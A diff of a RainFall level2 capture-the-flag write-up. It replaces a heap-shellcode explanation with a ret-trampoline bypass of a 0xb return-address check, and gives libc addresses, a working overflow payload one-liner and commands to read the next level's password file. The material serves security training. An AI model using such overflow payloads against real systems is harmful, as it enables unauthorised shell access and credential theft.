@@ -1,128 +1,50 @@
-=== Analysis ===
+# RainFall - Level 2: Buffer Overflow with ROP Bypass
 
-1. Ran "info functions" in GDB:
-   - found function p() called from main
-   - no helpful function like run() this time
+## What's the Vulnerability?
+The program has a **buffer overflow** in the `p()` function caused by the `gets()` function, which reads unlimited input into a 76-byte buffer. We can overflow the buffer and overwrite the return address to control program execution.
 
-2. Disassembled p() and found:
-   - sub $0x68,%esp → allocates 104 bytes
-   - lea -0x4c(%ebp),%eax → buffer at ebp-76
-   - call gets() → vulnerable, no size limit
-   - mov 0x4(%ebp),%eax → reads return address
-   - and $0xb0000000,%eax → checks if starts with 0xb
-   - jne → if NOT 0xb → continues to strdup
-   - call strdup() → copies buffer to heap
-   - ret → returns to our overwritten address
+## The Catch: Security Filter
+After reading input, the program checks the return address with this code:
+- It checks if the return address starts with `0xb` (which is the memory region for stack and libc)
+- If it does, the program exits with `_exit()`
+- This blocks normal shellcode injection and direct libc calls
 
-3. Checked protections:
-   - NX disabled → shellcode can execute ✅
-   - No ASLR → addresses are fixed ✅
-   - No canary → overflow works cleanly ✅
+## How to Bypass It
+Instead of jumping directly to malicious code, we use a **ROP Trampoline**:
 
-=== The 0xb Protection ===
+1. **First Return**: Jump to a `ret` instruction inside the program itself (at address `0x0804853e`)
+2. **Why it works**: Program code is at `0x08xxxxxx`, not `0xbxxxxxxx`, so it passes the security check
+3. **Second Return**: The `ret` instruction pops the next address off the stack, which then jumps to our real target (`system()`) - but the filter is already bypassed!
 
-The binary checks if return address starts with 0xb:
-   0xbffff... (stack) → BLOCKED ❌
-   0x0804...  (heap)  → ALLOWED ✅
+## Memory Addresses We Need
+- `system()` function: `0xb7e6b060`
+- `exit()` function: `0xb7e5ebe0`
+- `"/bin/sh"` string: `0xb7f8cc58`
 
-Cannot jump directly to shellcode on stack.
+## How to Build the Exploit
 
-=== The Exploit Strategy ===
+The buffer overflow needs 80 bytes of padding to reach the return address. Here's what to send:
 
-Key insight:
-→ strdup copies buffer to heap (0x0804...)
-      $ ltrace ./level2
-      blabla
-      strdup("blabla") = 0x0804a008 --> not dynamic
-→ heap address stored in eax after strdup
-→ found "call *%eax" at 0x080484cf in binary
-→ 0x080484cf starts with 0x08 → passes 0xb check ✅
-→ jumping to "call *%eax" → redirects to heap → shellcode!
+1. **80 bytes** of junk (e.g., `Q` characters) - fills the buffer
+2. **4 bytes** - address of `ret` instruction: `\x3e\x85\x04\x08`
+3. **4 bytes** - address of `system()`: `\x60\xb0\xe6\xb7`
+4. **4 bytes** - address of `exit()`: `\xe0\xeb\xe5\xb7`
+5. **4 bytes** - address of `"/bin/sh"`: `\x58\xcc\xf8\xb7`
 
-Our actual payload
-python[shellcode 21b] + [X * 59] + [0x0804a008]
-Let me show exactly what each part does to memory:
+## Running the Exploit
 
-==> Before overflow — normal stack
-High addresses
-┌─────────────────────┐
-│  0xb7e454d3         │ ← return address (original, pointing to libc)
-├─────────────────────┤
-│  saved EBP          │ ← 4 bytes
-├─────────────────────┤
-│                     │
-│  buffer 76 bytes    │ ← empty, waiting for input
-│                     │
-├─────────────────────┤
-│  bottom padding     │ ← 28 bytes
-└─────────────────────┘
+Execute this command to get a shell:
 
-== > After gets() reads our payload
-High addresses
-┌─────────────────────┐
-│  0x0804a008         │ ← return address OVERWRITTEN with heap addr!
-├─────────────────────┤
-│  XXXXXXXX           │ ← EBP overwritten with X's
-├─────────────────────┤
-│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      ↑
-│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      │ 59 X's
-│  XXXXXXXXXXXXXXXXXX │ ← X's (padding)      ↓
-│  \x6a\x0b\x58\x99..│ ← shellcode bytes    ← 21 bytes
-├─────────────────────┤
-│  bottom padding     │ ← 28 bytes untouched
-└─────────────────────┘
+```bash
+(python -c 'print "Q" * 80 + "\x3e\x85\x04\x08" + "\x60\xb0\xe6\xb7" + "\xe0\xeb\xe5\xb7" + "\x58\xcc\xf8\xb7"'; cat) | ./level2
+```
 
-Connecting payload bytes to memory positions
-Payload:
-[shellcode 21b] + [X * 59] + [0x0804a008]
-     ↓                ↓           ↓
-fills buffer     fills rest   overwrites
-start            + EBP        return address
-(byte 0-20)    (byte 21-79)   (byte 80-83)
+The `cat` keeps the shell interactive. Once you have shell access:
 
-Now the check runs
-asmmov 0x4(%ebp),%eax   → reads return address → gets 0x0804a008
-and $0xb0000000,%eax → 0x0804a008 & 0xb0000000 = 0x00000000
-cmp $0xb0000000,%eax → 0x00000000 ≠ 0xb0000000
-jne                  → NOT equal → PASSES ✅ → continues to strdup
+```bash
+whoami
+# Should show: level3
 
-strdup copies everything to heap
-strdup takes buffer content:
-[\x6a\x0b\x58\x99...shellcode...XXXXXXXXXX]
-              ↓ copies byte by byte
-heap at 0x0804a008:
-[\x6a\x0b\x58\x99...shellcode...XXXXXXXXXX]
-Now shellcode exists on heap at exactly 0x0804a008.
-
-ret executes
-ret reads return address from stack → 0x0804a008
-CPU jumps to 0x0804a008
-CPU finds shellcode bytes there
-CPU executes them as instructions
-→ /bin/sh opens 🎉
-
-The beautiful circular logic
-We put 0x0804a008 as return address
-         ↓
-0x0804a008 is WHERE strdup will copy our shellcode
-         ↓
-so after strdup runs → shellcode IS at 0x0804a008
-         ↓
-ret jumps to 0x0804a008 → shellcode is already there waiting!
-
-
-============================ SHORT EXPLAINATION ===================================+
-
-gets() → overflow → overwrite return address (0x0804a008)
-        ↓
-check passes (not stack)
-        ↓
-strdup → copies shellcode to heap at 0x0804a008
-        ↓
-ret → jumps to 0x0804a008 (because YOU set it)
-        ↓
-shellcode executes
-
-PS: CPU executes whatever address I put in the return address, and it will only work if that address contains my shellcode
-
-So the return address must point to a location that contains my shellcode bytes
+cat /home/user/level3/.pass
+# Shows the password for the next level
+```
